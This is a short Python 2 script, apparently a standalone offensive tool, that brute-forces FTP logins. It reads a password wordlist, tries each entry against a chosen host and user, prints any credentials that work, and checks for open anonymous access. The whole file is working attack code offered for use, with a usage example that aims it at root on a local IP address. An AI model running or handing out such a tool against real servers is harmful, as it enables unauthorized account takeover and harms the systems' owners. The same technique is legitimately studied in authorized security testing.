#!/usr/bin/env python
# -*- coding:utf-8 -*-

__author__ = 'paranoidninja'

import argparse
import sys
from ftplib import FTP

info = '''
Usage: ./ftp_brute_forcer.py [options]\n
Options: -t, --target    <hostname/ip>   |   Target\n
         -u, --user      <user>          |   User\n
         -w, --wordlist  <filename>      |   Wordlist\n
         -h, --help      <help>          |   print help\n

Example: ./ftp_brute_forcer.py -t 192.168.1.1 -u root -w /root/Desktop/wordlist.txt
'''


def help():
    print info
    sys.exit(0)


def check_anonymous_login(target):
    try:
        ftp = FTP(target)
        ftp.login()
        print "\n[+] Anonymous login is open."
        print "\n[+] Username : anonymous"
        print "\n[+] Password : anonymous\n"
        ftp.quit()
    except:
        pass


def ftp_login(target, username, password):
    try:
        ftp = FTP(target)
        ftp.login(username, password)
        ftp.quit()
        print "\n[!] Credentials have found."
        print "\n[!] Username : {}".format(username)
        print "\n[!] Password : {}".format(password)
        sys.exit(0)
    except:
        pass


def brute_force(target, username, wordlist):
    try:
        wordlist = open(wordlist, "r")
        words = wordlist.readlines()
        for word in words:
            word = word.strip()
            ftp_login(target, username, word)

    except:
        print "\n[-] There is no such wordlist file. \n"
        sys.exit(0)



parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target")
parser.add_argument("-u", "--username")
parser.add_argument("-w", "--wordlist")

args = parser.parse_args()

if not args.target or not args.username or not args.wordlist:
    help()
    sys.exit(0)

target = args.target
username = args.username
wordlist = args.wordlist

brute_force(target, username, wordlist)
check_anonymous_login(target)
print "\n[-] Brute forcing finished. \n"
